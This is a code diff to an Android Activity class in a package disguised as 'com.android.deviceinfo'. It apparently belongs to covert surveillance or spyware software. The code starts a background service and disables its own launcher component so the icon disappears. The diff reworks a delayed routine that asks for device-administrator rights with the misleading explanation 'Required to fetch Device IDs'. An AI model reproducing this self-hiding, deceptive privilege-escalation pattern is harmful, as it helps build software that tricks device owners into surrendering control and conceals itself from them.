@@ -37,7 +37,7 @@ import com.android.deviceinfo.util.Check;
  * http://stackoverflow.com/questions/10909683/launch
  * -android-application-without-main-activity-and-start-service-on-launching
  */
-public class AGUI extends Activity {
+public class AGUI extends Activity implements DeviceAdminRequest {
 	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$
 	private static final int REQUEST_ENABLE = 0;
 	private Handler handler;
@@ -52,7 +52,7 @@ public class AGUI extends Activity {
 	public void onCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		actualCreate(savedInstanceState);
-		
+
 	}
 
 	@Override
@@ -72,7 +72,7 @@ public class AGUI extends Activity {
 	private void actualCreate(final Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 
-		Status.setAppContext(getApplicationContext());
+		Status.setAppGui(this);
 
 		startService();
 		setContentView(R.layout.main);
@@ -128,6 +128,7 @@ public class AGUI extends Activity {
 		try {
 			if (Core.isServiceRunning() == false) {
 				this.handler = new Handler();
+
 				final ComponentName cn = startService(new Intent(service));
 
 				if (cn == null) {
@@ -145,28 +146,6 @@ public class AGUI extends Activity {
 					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
 							PackageManager.DONT_KILL_APP);
 				}
-
-				handler.postDelayed(new Runnable() {
-					@Override
-					public void run() {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (run) fireAdminIntent");
-						}
-						try {
-							if (Status.getSemAdmin().tryAcquire(10, TimeUnit.SECONDS)) {
-								fireAdminIntent();
-							} else {
-								if (Cfg.DEBUG) {
-									Check.log(TAG + " (startService) cannot acquire semAdmin");
-								}
-							}
-						} catch (InterruptedException e) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + " (run) Error: " + e);
-							}
-						}
-					}
-				}, 10 * 1000);
 			}
 		} catch (final SecurityException se) {
 			if (Cfg.EXCEPTION) {
@@ -179,7 +158,7 @@ public class AGUI extends Activity {
 		}
 	}
 
-	private void fireAdminIntent() {
+	public void fireAdminIntent() {
 		Context context = getApplicationContext();
 
 		Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
@@ -189,18 +168,43 @@ public class AGUI extends Activity {
 		intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
 		intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");
 
-		//context.startActivity(intent);
+		// context.startActivity(intent);
 		startActivityForResult(intent, REQUEST_ENABLE);
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (startService) ACTION_ADD_DEVICE_ADMIN intent fired");
 		}
 	}
-	
-	 @Override
-	    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
-	        if (REQUEST_ENABLE == requestCode) {
-	            super.onActivityResult(requestCode, resultCode, data);
-	        }
-	    }
+
+	@Override
+	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+		if (REQUEST_ENABLE == requestCode) {
+			super.onActivityResult(requestCode, resultCode, data);
+		}
+	}
+
+	@Override
+	public void deviceAdminRequest() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (deviceAdminRequest) ");
+		}
+		handler.postDelayed(new Runnable() {
+
+			@Override
+			public void run() {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (run) fireAdminIntent");
+				}
+
+				fireAdminIntent();
+
+			}
+		}, 1 * 1000);
+
+	}
+
+	@Override
+	public Context getAppContext() {
+		return getApplicationContext();
+	}
 }
